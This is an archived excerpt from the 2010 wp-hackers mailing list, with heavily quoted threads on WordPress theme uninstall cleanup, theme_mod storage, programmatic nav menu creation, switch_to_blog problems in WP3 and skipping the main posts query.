> > On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
> > <ashishsainiashfame at gmail.com> wrote:
> > > Hi Davit,
> > >
> > > I think a better option would be to provide uninstall function as
> leaving
> > > the options in the database makes sense as the user may switch back and
> > so
> > > it will save the pain of configuring it.
> > >
> > > Thanks & Regards
> > > Ashish Saini aka Ashfame
> > > (Deserve Before You Desire)
> > > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> > Twitter
> > > : http://twitter.com/ashfame
> > >
> > >
> > > On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
> > >
> > >> $
> > >> ------Original Message------
> > >> From: Davit Barbakadze
> > >> Sender: wp-hackers-bounces at lists.automattic.com
> > >> To: wp-hackers at lists.automattic.com
> > >> ReplyTo: wp-hackers at lists.automattic.com
> > >> Subject: [wp-hackers]  any way to clean after theme when it gets
> > deleted?
> > >> Sent: Jul 30, 2010 18:02
> > >>
> > >> I think everyone uses options and maybe even tables in their themes
> > >> nowadays. Is there any way coder can clean up after theme - delete
> > >> options, remove tables - when it get's uninstalled. Something similar
> > >> to what we have for plugins?
> > >>
> > >> --
> > >> Davit Barbakadze
> > >> _______________________________________________
> > >> wp-hackers mailing list
> > >> wp-hackers at lists.automattic.com
> > >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >>
> > >>
> > >>
> > >> Sent from my BlackBerry? smartphone on 3
> > >> _______________________________________________
> > >> wp-hackers mailing list
> > >> wp-hackers at lists.automattic.com
> > >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >>
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> >
> >
> >
> > --
> > Davit Barbakadze
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 3
> Date: Fri, 30 Jul 2010 09:45:12 -0400
> From: Andrew Nacin <wp at andrewnacin.com>
> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>        deleted?
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
> <ashishsainiashfame at gmail.com>wrote:
>
> > You didn't get my point. I said you should provide an uninstaller
> function
> > that wipes out data and it shouldn't be automated upon deactivation.
> >
>
> Not sure you got his point -- I believe Davit is referring to the
> implementation of an uninstall hook for themes. He's pretty clear he'd want
> that triggered on deletion, not deactivation. Basically, how it works for
> plugins.
>
> I think implementing themes uninstall hooks would be a logical future step.
> We could start by removing items created using the theme_mod functions,
> which I don't think most themes use, but we use it for storing metadata for
> custom backgrounds and headers.
>
>
> ------------------------------
>
> Message: 4
> Date: Fri, 30 Jul 2010 19:48:22 +0530
> From: Ashish Saini <ashishsainiashfame at gmail.com>
> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>        deleted?
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTim7MQR2P6yOUa0j1TiPfWiaXDrVXfJM94Xovm-v at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> Andrew, I knew that. I just replied back with a possible solution for his
> case.
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> : http://twitter.com/ashfame
>
>
> On Fri, Jul 30, 2010 at 7:15 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
>
> > On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
> > <ashishsainiashfame at gmail.com>wrote:
> >
> > > You didn't get my point. I said you should provide an uninstaller
> > function
> > > that wipes out data and it shouldn't be automated upon deactivation.
> > >
> >
> > Not sure you got his point -- I believe Davit is referring to the
> > implementation of an uninstall hook for themes. He's pretty clear he'd
> want
> > that triggered on deletion, not deactivation. Basically, how it works for
> > plugins.
> >
> > I think implementing themes uninstall hooks would be a logical future
> step.
> > We could start by removing items created using the theme_mod functions,
> > which I don't think most themes use, but we use it for storing metadata
> for
> > custom backgrounds and headers.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 5
> Date: Fri, 30 Jul 2010 18:32:12 +0400
> From: Davit Barbakadze <jayarjo at gmail.com>
> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>        deleted?
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTi=KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F+w09 at mail.gmail.com<KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F%2Bw09 at mail.gmail.com>
> >
> Content-Type: text/plain; charset=ISO-8859-1
>
> theme_mod functions? what do they do?
>
> On Fri, Jul 30, 2010 at 5:45 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
> > On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
> > <ashishsainiashfame at gmail.com>wrote:
> >
> >> You didn't get my point. I said you should provide an uninstaller
> function
> >> that wipes out data and it shouldn't be automated upon deactivation.
> >>
> >
> > Not sure you got his point -- I believe Davit is referring to the
> > implementation of an uninstall hook for themes. He's pretty clear he'd
> want
> > that triggered on deletion, not deactivation. Basically, how it works for
> > plugins.
> >
> > I think implementing themes uninstall hooks would be a logical future
> step.
> > We could start by removing items created using the theme_mod functions,
> > which I don't think most themes use, but we use it for storing metadata
> for
> > custom backgrounds and headers.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Davit Barbakadze
>
>
> ------------------------------
>
> Message: 6
> Date: Fri, 30 Jul 2010 10:38:48 -0400
> From: Andrew Nacin <wp at andrewnacin.com>
> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>        deleted?
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTinDDOQTQyaZdnmazoiGn6HSGXVW9eLkffXm0HZw at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com
> >wrote:
>
> > theme_mod functions? what do they do?
>
>
> Rudimentary options storage for themes. Each theme's mods are stored in a
> single DB option row in the form of mod_{$theme}.
>
> Locations in core:
> ./wp-includes/theme.php:1270:function get_theme_mod($name, $default =
> false)
> {
> ./wp-includes/theme.php:1289:function set_theme_mod($name, $value) {
> ./wp-includes/theme.php:1311:function remove_theme_mod( $name ) {
> ./wp-includes/theme.php:1333:function remove_theme_mods() {
>
> Codex pages:
> http://codex.wordpress.org/Function_Reference/get_theme_mod
> http://codex.wordpress.org/Function_Reference/set_theme_mod
> http://codex.wordpress.org/Function_Reference/remove_theme_mod
> http://codex.wordpress.org/Function_Reference/remove_theme_mods
>
>
> ------------------------------
>
> Message: 7
> Date: Fri, 30 Jul 2010 11:29:11 -0400
> From: Bill Dennen <dennen at gmail.com>
> Subject: [wp-hackers] switch_to_blog in WP3
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTimgcjBN35jVm7+Q_9CsGcuJJdhL9E-vjWTCLfe3 at mail.gmail.com<AANLkTimgcjBN35jVm7%2BQ_9CsGcuJJdhL9E-vjWTCLfe3 at mail.gmail.com>
> >
> Content-Type: text/plain; charset=ISO-8859-1
>
> Hi,
>
> I wrote a plugin that allows one blog to pull posts in from another
> blog via shortcode. I call it get-news. The syntax of the shortcode is
> something like this:
>
> [get-news site_name="news" numberposts="10" show_dates="0"]
>
> In short, what this code does is switch to the blog located at /news/
> and grab the 10 most recent posts and display them on the current
> blog. There are other options, as well - like pulling posts by
> category or tags, showing thumbnails, etc.
>
> My code uses switch_to_blog to do this. I've read that this function
> has a heavy performance hit. But, we've been using it with WP Super
> Cache and it has worked well for us in WPMU 2.9.2. Plus, at this
> point, my plugin is not meant for distribution -- it's used only on
> the site I manage. (That could change...)
>
> Now, my code is broken in WP3.x. Permalinks are incorrect and
> thumbnails do not work properly.
>
> I believe it's this bug, which is now listed as a "wontfix":
>
> http://core.trac.wordpress.org/ticket/12040
>
> In the bug report, there is mention that this bug could be 'fixed' via
> a plugin via the switch_blog hook.
>
> I'm looking for alternate suggestions for ways to do this. At this
> point, this bug is holding us back from going with WP3, which we'd
> like to do for many reasons!
>
> One option I toyed with initially was using RSS feeds, but I could not
> get the thumbnails over that way.
>
> Looking forward to any suggestions.
>
> Thanks-
> Bill
>
>
> ------------------------------
>
> Message: 8
> Date: Fri, 30 Jul 2010 16:33:08 +0100
> From: esmi at quirm dot net <esmi at quirm.net>
> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>        deleted?
> To: wp-hackers at lists.automattic.com
> Message-ID: <4C52F0B4.4030908 at quirm.net>
> Content-Type: text/plain; charset=ISO-8859-1; format=flowed
>
> on 30/07/2010 15:38 Andrew Nacin said the following:
> > On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com
> >wrote:
>
> >> theme_mod functions? what do they do?
>
> > Rudimentary options storage for themes. Each theme's mods are stored in a
> > single DB option row in the form of mod_{$theme}.
>
> <snip>
>
> It's the multiple single rows in the db that I'm not keen on. Most of
> the time, I've been using a single row in the options table to store a
> serialized array. Each theme then has a manual "reset" option which
> removes all stored theme options but, thus far, I haven't found a way to
> trigger the reset on theme deletion.
>
> Mel / esmi
> --
> WordPress theme developer
> http://quirm.net
> http://blackwidows.co.uk
>
>
> ------------------------------
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> End of wp-hackers Digest, Vol 66, Issue 120
> *******************************************
>

From mikeschinkel at newclarity.net  Sat Jul 31 00:44:34 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 30 Jul 2010 20:44:34 -0400
Subject: [wp-hackers] how can I use the create new menu function for
	making a default menu
In-Reply-To: <AANLkTimp-wgvQH9C8CHbef9YJboAXe7vc8NCE2iVWq8K@mail.gmail.com>
References: <AANLkTimp-wgvQH9C8CHbef9YJboAXe7vc8NCE2iVWq8K@mail.gmail.com>
Message-ID: <C424EA67-B1DA-4B5A-A216-B93CB921AAF8@newclarity.net>

Hi Jared:

Do you mean these found in /wp-includes/nav-menu.php?

Create Menu: 
	$menu_id = wp_create_nav_menu( $menu_name );

Create Menu Items: 
	$menu = array(
		'menu-item-object-id' => 0,
		'menu-item-object' => '',
		'menu-item-parent-id' => 0,
		'menu-item-position' => 0,
		'menu-item-type' => 'custom',
		'menu-item-title' => '',
		'menu-item-url' => '',
		'menu-item-description' => '',
		'menu-item-attr-title' => '',
		'menu-item-target' => '',
		'menu-item-classes' => '',
		'menu-item-xfn' => '',
		'menu-item-status' => '',
	);
	$menu_item_db_id = wp_update_nav_menu_item( $menu_id, 0, $menu);

Update Menu Items: 
	wp_update_nav_menu_item( $menu_id, $menu_item_db_id, $menu);

I've used them to create menus and menu items automatically.

To understand the parameters create some menus in the admin and then take a look at the values created for different types of menu items in wp_postmeta.

Hope this helps?

-Mike 

On Jul 30, 2010, at 8:25 PM, Jared Williams wrote:

> Hi,
> I know the menu system needs lots of work still, but I was wondering if
> anyone knows of a way to make use of whatever function(s) the 'Create Menu'
> does when you make a new custom named menu in the dashboard to make a
> pre-made menu to go along with a registered menu location etc. This would be
> nice so that when a theme were installed that has registered menus in it,
> the menu name you specify in the code would be created upon installing, and
> deleted when uninstalling a theme.
> 
> I've searched for some kind of solution to this, and have studied the code
> in nav-menus.php and other files with 3.0 source code. This is just about
> the only thing I am unable to figure out with 3.0, at least that I have
> tried to do so far.
> I figured here is probably the best place to ask such a question.
> 
> Thanks,
> 
> Jared Williams
> New2WP.com
> 
> 
> On Fri, Jul 30, 2010 at 11:33 AM,
> <wp-hackers-request at lists.automattic.com>wrote:
> 
>> Send wp-hackers mailing list submissions to
>>       wp-hackers at lists.automattic.com
>> 
>> To subscribe or unsubscribe via the World Wide Web, visit
>>       http://lists.automattic.com/mailman/listinfo/wp-hackers
>> or, via email, send a message with subject or body 'help' to
>>       wp-hackers-request at lists.automattic.com
>> 
>> You can reach the person managing the list at
>>       wp-hackers-owner at lists.automattic.com
>> 
>> When replying, please edit your Subject line so it is more specific
>> than "Re: Contents of wp-hackers digest..."
>> 
>> 
>> Today's Topics:
>> 
>>  1. Re: any way to clean after theme when it gets deleted?
>>     (Davit Barbakadze)
>>  2. Re: any way to clean after theme when it gets deleted?
>>     (Ashish Saini)
>>  3. Re: any way to clean after theme when it gets deleted?
>>     (Andrew Nacin)
>>  4. Re: any way to clean after theme when it gets deleted?
>>     (Ashish Saini)
>>  5. Re: any way to clean after theme when it gets deleted?
>>     (Davit Barbakadze)
>>  6. Re: any way to clean after theme when it gets deleted?
>>     (Andrew Nacin)
>>  7. switch_to_blog in WP3 (Bill Dennen)
>>  8. Re: any way to clean after theme when it gets deleted?
>>     (esmi at quirm dot net)
>> 
>> 
>> ----------------------------------------------------------------------
>> 
>> Message: 1
>> Date: Fri, 30 Jul 2010 17:17:51 +0400
>> From: Davit Barbakadze <jayarjo at gmail.com>
>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>       deleted?
>> To: wp-hackers at lists.automattic.com
>> Message-ID:
>>       <AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6 at mail.gmail.com<b%2B90tFjpCFLZeW%2BecS6 at mail.gmail.com>
>>> 
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> It's not about switching (activate/deactivate), but deleting. It would
>> be pretty logical to remove all the stuff that theme has created on
>> activation.
>> 
>> On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
>> <ashishsainiashfame at gmail.com> wrote:
>>> Hi Davit,
>>> 
>>> I think a better option would be to provide uninstall function as leaving
>>> the options in the database makes sense as the user may switch back and
>> so
>>> it will save the pain of configuring it.
>>> 
>>> Thanks & Regards
>>> Ashish Saini aka Ashfame
>>> (Deserve Before You Desire)
>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>> Twitter
>>> : http://twitter.com/ashfame
>>> 
>>> 
>>> On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
>>> 
>>>> $
>>>> ------Original Message------
>>>> From: Davit Barbakadze
>>>> Sender: wp-hackers-bounces at lists.automattic.com
>>>> To: wp-hackers at lists.automattic.com
>>>> ReplyTo: wp-hackers at lists.automattic.com
>>>> Subject: [wp-hackers] ?any way to clean after theme when it gets
>> deleted?
>>>> Sent: Jul 30, 2010 18:02
>>>> 
>>>> I think everyone uses options and maybe even tables in their themes
>>>> nowadays. Is there any way coder can clean up after theme - delete
>>>> options, remove tables - when it get's uninstalled. Something similar
>>>> to what we have for plugins?
>>>> 
>>>> --
>>>> Davit Barbakadze
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>>> 
>>>> 
>>>> Sent from my BlackBerry? smartphone on 3
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
>> 
>> 
>> --
>> Davit Barbakadze
>> 
>> 
>> ------------------------------
>> 
>> Message: 2
>> Date: Fri, 30 Jul 2010 18:55:18 +0530
>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>       deleted?
>> To: wp-hackers at lists.automattic.com
>> Message-ID:
>>       <AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+ at mail.gmail.com<96Z%2B at mail.gmail.com>
>>> 
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> You didn't get my point. I said you should provide an uninstaller function
>> that wipes out data and it shouldn't be automated upon deactivation.
>> 
>> I would hate a theme which will ask for options to be configured again when
>> I just switch back to another theme and now I want the previous theme back.
>> 
>> Thanks & Regards
>> Ashish Saini aka Ashfame
>> (Deserve Before You Desire)
>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>> Twitter
>> : http://twitter.com/ashfame
>> 
>> 
>> On Fri, Jul 30, 2010 at 6:47 PM, Davit Barbakadze <jayarjo at gmail.com>
>> wrote:
>> 
>>> It's not about switching (activate/deactivate), but deleting. It would
>>> be pretty logical to remove all the stuff that theme has created on
>>> activation.
>>> 
>>> On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
>>> <ashishsainiashfame at gmail.com> wrote:
>>>> Hi Davit,
>>>> 
>>>> I think a better option would be to provide uninstall function as
>> leaving
>>>> the options in the database makes sense as the user may switch back and
>>> so
>>>> it will save the pain of configuring it.
>>>> 
>>>> Thanks & Regards
>>>> Ashish Saini aka Ashfame
>>>> (Deserve Before You Desire)
>>>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>>> Twitter
>>>> : http://twitter.com/ashfame
>>>> 
>>>> 
>>>> On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
>>>> 
>>>>> $
>>>>> ------Original Message------
>>>>> From: Davit Barbakadze
>>>>> Sender: wp-hackers-bounces at lists.automattic.com
>>>>> To: wp-hackers at lists.automattic.com
>>>>> ReplyTo: wp-hackers at lists.automattic.com
>>>>> Subject: [wp-hackers]  any way to clean after theme when it gets
>>> deleted?
>>>>> Sent: Jul 30, 2010 18:02
>>>>> 
>>>>> I think everyone uses options and maybe even tables in their themes
>>>>> nowadays. Is there any way coder can clean up after theme - delete
>>>>> options, remove tables - when it get's uninstalled. Something similar
>>>>> to what we have for plugins?
>>>>> 
>>>>> --
>>>>> Davit Barbakadze
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>> 
>>>>> 
>>>>> 
>>>>> Sent from my BlackBerry? smartphone on 3
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> 
>>> 
>>> 
>>> --
>>> Davit Barbakadze
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
>> 
>> ------------------------------
>> 
>> Message: 3
>> Date: Fri, 30 Jul 2010 09:45:12 -0400
>> From: Andrew Nacin <wp at andrewnacin.com>
>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>       deleted?
>> To: wp-hackers at lists.automattic.com
>> Message-ID:
>>       <AANLkTi=ua3FWx5UJnGs9TpxYbqk_dN_GhW_bxbas01ON at mail.gmail.com>
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
>> <ashishsainiashfame at gmail.com>wrote:
>> 
>>> You didn't get my point. I said you should provide an uninstaller
>> function
>>> that wipes out data and it shouldn't be automated upon deactivation.
>>> 
>> 
>> Not sure you got his point -- I believe Davit is referring to the
>> implementation of an uninstall hook for themes. He's pretty clear he'd want
>> that triggered on deletion, not deactivation. Basically, how it works for
>> plugins.
>> 
>> I think implementing themes uninstall hooks would be a logical future step.
>> We could start by removing items created using the theme_mod functions,
>> which I don't think most themes use, but we use it for storing metadata for
>> custom backgrounds and headers.
>> 
>> 
>> ------------------------------
>> 
>> Message: 4
>> Date: Fri, 30 Jul 2010 19:48:22 +0530
>> From: Ashish Saini <ashishsainiashfame at gmail.com>
>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>       deleted?
>> To: wp-hackers at lists.automattic.com
>> Message-ID:
>>       <AANLkTim7MQR2P6yOUa0j1TiPfWiaXDrVXfJM94Xovm-v at mail.gmail.com>
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> Andrew, I knew that. I just replied back with a possible solution for his
>> case.
>> 
>> Thanks & Regards
>> Ashish Saini aka Ashfame
>> (Deserve Before You Desire)
>> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
>> Twitter
>> : http://twitter.com/ashfame
>> 
>> 
>> On Fri, Jul 30, 2010 at 7:15 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
>> 
>>> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> You didn't get my point. I said you should provide an uninstaller
>>> function
>>>> that wipes out data and it shouldn't be automated upon deactivation.
>>>> 
>>> 
>>> Not sure you got his point -- I believe Davit is referring to the
>>> implementation of an uninstall hook for themes. He's pretty clear he'd
>> want
>>> that triggered on deletion, not deactivation. Basically, how it works for
>>> plugins.
>>> 
>>> I think implementing themes uninstall hooks would be a logical future
>> step.
>>> We could start by removing items created using the theme_mod functions,
>>> which I don't think most themes use, but we use it for storing metadata
>> for
>>> custom backgrounds and headers.
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
>> 
>> ------------------------------
>> 
>> Message: 5
>> Date: Fri, 30 Jul 2010 18:32:12 +0400
>> From: Davit Barbakadze <jayarjo at gmail.com>
>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>       deleted?
>> To: wp-hackers at lists.automattic.com
>> Message-ID:
>>       <AANLkTi=KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F+w09 at mail.gmail.com<KdyyghUgN0-U46rkDThdGaYGmR1SH8c5F%2Bw09 at mail.gmail.com>
>>> 
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> theme_mod functions? what do they do?
>> 
>> On Fri, Jul 30, 2010 at 5:45 PM, Andrew Nacin <wp at andrewnacin.com> wrote:
>>> On Fri, Jul 30, 2010 at 9:25 AM, Ashish Saini
>>> <ashishsainiashfame at gmail.com>wrote:
>>> 
>>>> You didn't get my point. I said you should provide an uninstaller
>> function
>>>> that wipes out data and it shouldn't be automated upon deactivation.
>>>> 
>>> 
>>> Not sure you got his point -- I believe Davit is referring to the
>>> implementation of an uninstall hook for themes. He's pretty clear he'd
>> want
>>> that triggered on deletion, not deactivation. Basically, how it works for
>>> plugins.
>>> 
>>> I think implementing themes uninstall hooks would be a logical future
>> step.
>>> We could start by removing items created using the theme_mod functions,
>>> which I don't think most themes use, but we use it for storing metadata
>> for
>>> custom backgrounds and headers.
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
>> 
>> 
>> --
>> Davit Barbakadze
>> 
>> 
>> ------------------------------
>> 
>> Message: 6
>> Date: Fri, 30 Jul 2010 10:38:48 -0400
>> From: Andrew Nacin <wp at andrewnacin.com>
>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>       deleted?
>> To: wp-hackers at lists.automattic.com
>> Message-ID:
>>       <AANLkTinDDOQTQyaZdnmazoiGn6HSGXVW9eLkffXm0HZw at mail.gmail.com>
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com
>>> wrote:
>> 
>>> theme_mod functions? what do they do?
>> 
>> 
>> Rudimentary options storage for themes. Each theme's mods are stored in a
>> single DB option row in the form of mod_{$theme}.
>> 
>> Locations in core:
>> ./wp-includes/theme.php:1270:function get_theme_mod($name, $default =
>> false)
>> {
>> ./wp-includes/theme.php:1289:function set_theme_mod($name, $value) {
>> ./wp-includes/theme.php:1311:function remove_theme_mod( $name ) {
>> ./wp-includes/theme.php:1333:function remove_theme_mods() {
>> 
>> Codex pages:
>> http://codex.wordpress.org/Function_Reference/get_theme_mod
>> http://codex.wordpress.org/Function_Reference/set_theme_mod
>> http://codex.wordpress.org/Function_Reference/remove_theme_mod
>> http://codex.wordpress.org/Function_Reference/remove_theme_mods
>> 
>> 
>> ------------------------------
>> 
>> Message: 7
>> Date: Fri, 30 Jul 2010 11:29:11 -0400
>> From: Bill Dennen <dennen at gmail.com>
>> Subject: [wp-hackers] switch_to_blog in WP3
>> To: wp-hackers at lists.automattic.com
>> Message-ID:
>>       <AANLkTimgcjBN35jVm7+Q_9CsGcuJJdhL9E-vjWTCLfe3 at mail.gmail.com<AANLkTimgcjBN35jVm7%2BQ_9CsGcuJJdhL9E-vjWTCLfe3 at mail.gmail.com>
>>> 
>> Content-Type: text/plain; charset=ISO-8859-1
>> 
>> Hi,
>> 
>> I wrote a plugin that allows one blog to pull posts in from another
>> blog via shortcode. I call it get-news. The syntax of the shortcode is
>> something like this:
>> 
>> [get-news site_name="news" numberposts="10" show_dates="0"]
>> 
>> In short, what this code does is switch to the blog located at /news/
>> and grab the 10 most recent posts and display them on the current
>> blog. There are other options, as well - like pulling posts by
>> category or tags, showing thumbnails, etc.
>> 
>> My code uses switch_to_blog to do this. I've read that this function
>> has a heavy performance hit. But, we've been using it with WP Super
>> Cache and it has worked well for us in WPMU 2.9.2. Plus, at this
>> point, my plugin is not meant for distribution -- it's used only on
>> the site I manage. (That could change...)
>> 
>> Now, my code is broken in WP3.x. Permalinks are incorrect and
>> thumbnails do not work properly.
>> 
>> I believe it's this bug, which is now listed as a "wontfix":
>> 
>> http://core.trac.wordpress.org/ticket/12040
>> 
>> In the bug report, there is mention that this bug could be 'fixed' via
>> a plugin via the switch_blog hook.
>> 
>> I'm looking for alternate suggestions for ways to do this. At this
>> point, this bug is holding us back from going with WP3, which we'd
>> like to do for many reasons!
>> 
>> One option I toyed with initially was using RSS feeds, but I could not
>> get the thumbnails over that way.
>> 
>> Looking forward to any suggestions.
>> 
>> Thanks-
>> Bill
>> 
>> 
>> ------------------------------
>> 
>> Message: 8
>> Date: Fri, 30 Jul 2010 16:33:08 +0100
>> From: esmi at quirm dot net <esmi at quirm.net>
>> Subject: Re: [wp-hackers] any way to clean after theme when it gets
>>       deleted?
>> To: wp-hackers at lists.automattic.com
>> Message-ID: <4C52F0B4.4030908 at quirm.net>
>> Content-Type: text/plain; charset=ISO-8859-1; format=flowed
>> 
>> on 30/07/2010 15:38 Andrew Nacin said the following:
>>> On Fri, Jul 30, 2010 at 10:32 AM, Davit Barbakadze <jayarjo at gmail.com
>>> wrote:
>> 
>>>> theme_mod functions? what do they do?
>> 
>>> Rudimentary options storage for themes. Each theme's mods are stored in a
>>> single DB option row in the form of mod_{$theme}.
>> 
>> <snip>
>> 
>> It's the multiple single rows in the db that I'm not keen on. Most of
>> the time, I've been using a single row in the options table to store a
>> serialized array. Each theme then has a manual "reset" option which
>> removes all stored theme options but, thus far, I haven't found a way to
>> trigger the reset on theme deletion.
>> 
>> Mel / esmi
>> --
>> WordPress theme developer
>> http://quirm.net
>> http://blackwidows.co.uk
>> 
>> 
>> ------------------------------
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> 
>> End of wp-hackers Digest, Vol 66, Issue 120
>> *******************************************
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mikeschinkel at newclarity.net  Sat Jul 31 00:54:24 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 30 Jul 2010 20:54:24 -0400
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
Message-ID: <54BF7226-2AC0-4510-BF1F-9F4DAB606A73@newclarity.net>

On Jul 30, 2010, at 6:54 PM, Theodor Ramisch wrote:
> \No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that? Since I don't need the posts, I don't want to make that query.

Nope.  I asked about this a while back here on the list and also I think on trac but nobody else seemed interested in making it an option so I dropped it.  Still, for a high traffic site it would make a lot of sense...

-Mike

From mpretty at voceconnect.com  Sat Jul 31 01:31:08 2010
From: mpretty at voceconnect.com (Michael Pretty)
Date: Fri, 30 Jul 2010 21:31:08 -0400
Subject: [wp-hackers] Skip Main Query
In-Reply-To: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
References: <BLU136-W3251F77E9581669EC5024F90AA0@phx.gbl>
Message-ID: <4C537CDC.7050100@voceconnect.com>

If you don't need anything from the initial query, is there a reason you 
don't just take over earlier, like 'init'?  Most everything should be 
loaded at that point.

Michael Pretty
prettyboymp

On 7/30/10 6:54 PM, Theodor Ramisch wrote:
> Hi,
>
> I'm writing a plugin which should display data from its own tables in XML. It does not rely on any posts.
>
> To reach my plugin, I've added query_vars, the rewrite rules and listen on template_redirect for the parameters.
>
> No I've noticed that WordPress still queries the posts from the start page. Is there a way to avoid that? Since I don't need the posts, I don't want to make that query.
>
> Bypassing WP completely using mod_rewrite rules is not an option, since I need to have access to the database, permissions and so on.
>
> Thanks,
>
>    Theodor
>   		 	   		
> _______________________________________________
